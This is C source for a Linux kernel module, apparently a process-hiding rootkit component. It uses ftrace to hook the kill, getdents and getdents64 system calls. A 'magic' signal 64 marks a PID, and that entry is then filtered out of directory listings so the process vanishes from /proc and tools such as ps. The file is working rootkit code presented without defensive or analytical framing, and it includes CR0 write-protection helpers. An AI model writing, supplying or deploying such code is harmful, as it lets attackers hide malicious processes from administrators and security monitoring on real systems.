#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/ftrace.h>
#include <linux/syscalls.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <asm/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("User");
MODULE_DESCRIPTION("Hide Process test (clean, warning-free)");

/*
 * On kernels 5.7+, kallsyms_lookup_name is no longer exported.
 * We must obtain it through kprobe.
 */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
#include <linux/kprobes.h>
static struct kprobe kp = {.symbol_name = "kallsyms_lookup_name"};
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t kallsyms_lookup_name_ptr;
#define KALLSYMS_LOOKUP_NAME kallsyms_lookup_name_ptr
#else
#define KALLSYMS_LOOKUP_NAME kallsyms_lookup_name
#endif

/* Disable/enable write protection on CR0 */
static inline void write_cr0_forced(unsigned long val)
{
    unsigned long __force_order;
    asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
}

static inline void unprotect_memory(void)
{
    write_cr0_forced(read_cr0() & (~0x10000));
}

static inline void protect_memory(void)
{
    write_cr0_forced(read_cr0() | 0x10000);
}

/* hide_pid stores the PID string we want to hide */
static char hide_pid[NAME_MAX];

/*
 * Hook function prototypes
 */
static asmlinkage int hook_kill(const struct pt_regs *regs);
static asmlinkage int hook_getdents64(const struct pt_regs *regs);
static asmlinkage int hook_getdents(const struct pt_regs *regs);

/*
 * Real syscall function pointers
 */
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);

/*
 * Lookup helper using kallsyms
 */
static unsigned long lookup_name(const char *name)
{
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
    register_kprobe(&kp);
    kallsyms_lookup_name_ptr = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);
#endif
    return KALLSYMS_LOOKUP_NAME(name);
}

/*
 * Hook for sys_kill
 * Signal 64 is our "magic" signal to hide a process.
 */
static asmlinkage int hook_kill(const struct pt_regs *regs)
{
    pid_t pid = (pid_t)regs->di;
    int sig = (int)regs->si;

    if (sig == 64)
    {
        printk(KERN_INFO "hide_process: Hiding PID %d\n", pid);
        snprintf(hide_pid, NAME_MAX, "%d", pid);
        return 0;
    }

    return orig_kill(regs);
}

/*
 * Hook for sys_getdents64
 */
static asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    int real_bytes = orig_getdents64(regs);
    struct linux_dirent64 *current_dir;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    long dir_entry_pos = 0;
    int bytes_copied = 0;

    if (real_bytes <= 0 || hide_pid[0] == '\0')
        return real_bytes;

    char *kernel_buffer = kmalloc(real_bytes, GFP_KERNEL);
    if (!kernel_buffer)
        return real_bytes;

    if (copy_from_user(kernel_buffer, dirent, real_bytes))
    {
        kfree(kernel_buffer);
        return real_bytes;
    }

    while (dir_entry_pos < real_bytes)
    {
        current_dir = (struct linux_dirent64 *)(kernel_buffer + dir_entry_pos);
        if (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) != 0)
        {
            if (copy_to_user((char __user *)dirent + bytes_copied,
                             current_dir, current_dir->d_reclen))
                break;
            bytes_copied += current_dir->d_reclen;
        }
        dir_entry_pos += current_dir->d_reclen;
    }
    kfree(kernel_buffer);
    return bytes_copied;
}

/*
 * Hook for sys_getdents (legacy version)
 */
struct linux_dirent
{
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

static asmlinkage int hook_getdents(const struct pt_regs *regs)
{
    int real_bytes = orig_getdents(regs);
    struct linux_dirent *current_dir;
    struct linux_dirent __user *dirent = (struct linux_dirent *)regs->si;
    long dir_entry_pos = 0;
    int bytes_copied = 0;

    if (real_bytes <= 0 || hide_pid[0] == '\0')
        return real_bytes;

    char *kernel_buffer = kmalloc(real_bytes, GFP_KERNEL);
    if (!kernel_buffer)
        return real_bytes;

    if (copy_from_user(kernel_buffer, dirent, real_bytes))
    {
        kfree(kernel_buffer);
        return real_bytes;
    }

    while (dir_entry_pos < real_bytes)
    {
        current_dir = (struct linux_dirent *)(kernel_buffer + dir_entry_pos);
        if (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) != 0)
        {
            if (copy_to_user((char __user *)dirent + bytes_copied,
                             current_dir, current_dir->d_reclen))
                break;
            bytes_copied += current_dir->d_reclen;
        }
        dir_entry_pos += current_dir->d_reclen;
    }
    kfree(kernel_buffer);
    return bytes_copied;
}

/*
 * Ftrace hooking infrastructure
 */
#define HOOK(_name, _function, _original) \
    {                                     \
        .name = (_name), .function = (_function), .original = (_original) \
    }

struct ftrace_hook
{
    const char *name;
    void *function;
    void *original;
    unsigned long address;
    struct ftrace_ops ops;
};

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
};

static void notrace ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                 struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    struct pt_regs *regs = ftrace_get_regs(fregs);

    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;
}

static int fh_install_hooks(void)
{
    int err, i;

    for (i = 0; i < ARRAY_SIZE(hooks); i++)
    {
        hooks[i].address = lookup_name(hooks[i].name);
        if (!hooks[i].address)
        {
            printk(KERN_ERR "hide_process: Cannot find symbol %s\n", hooks[i].name);
            return -ENOENT;
        }

        *(unsigned long *)hooks[i].original = hooks[i].address;
        hooks[i].ops.func = ftrace_thunk;
        hooks[i].ops.flags = FTRACE_OPS_FL_SAVE_REGS |
                             FTRACE_OPS_FL_RECURSION |
                             FTRACE_OPS_FL_IPMODIFY;

        err = ftrace_set_filter_ip(&hooks[i].ops, hooks[i].address, 0, 0);
        if (err)
        {
            printk(KERN_ERR "hide_process: ftrace_set_filter_ip() failed: %d\n", err);
            return err;
        }

        err = register_ftrace_function(&hooks[i].ops);
        if (err)
        {
            printk(KERN_ERR "hide_process: register_ftrace_function() failed: %d\n", err);
            ftrace_set_filter_ip(&hooks[i].ops, hooks[i].address, 1, 0);
            return err;
        }
    }
    return 0;
}

static void fh_remove_hooks(void)
{
    int i;
    for (i = 0; i < ARRAY_SIZE(hooks); i++)
    {
        unregister_ftrace_function(&hooks[i].ops);
        ftrace_set_filter_ip(&hooks[i].ops, hooks[i].address, 1, 0);
    }
}

/*
 * Module init and exit
 */
static int __init hide_process_init(void)
{
    int err;
    hide_pid[0] = '\0';
    printk(KERN_INFO "hide_process: Module loaded.\n");
    err = fh_install_hooks();
    if (err)
    {
        printk(KERN_ERR "hide_process: Failed to install hooks.\n");
        return err;
    }
    printk(KERN_INFO "hide_process: Hooks installed successfully.\n");
    return 0;
}

static void __exit hide_process_exit(void)
{
    fh_remove_hooks();
    printk(KERN_INFO "hide_process: Hooks removed.\n");
    printk(KERN_INFO "hide_process: Module unloaded.\n");
}

module_init(hide_process_init);
module_exit(hide_process_exit);
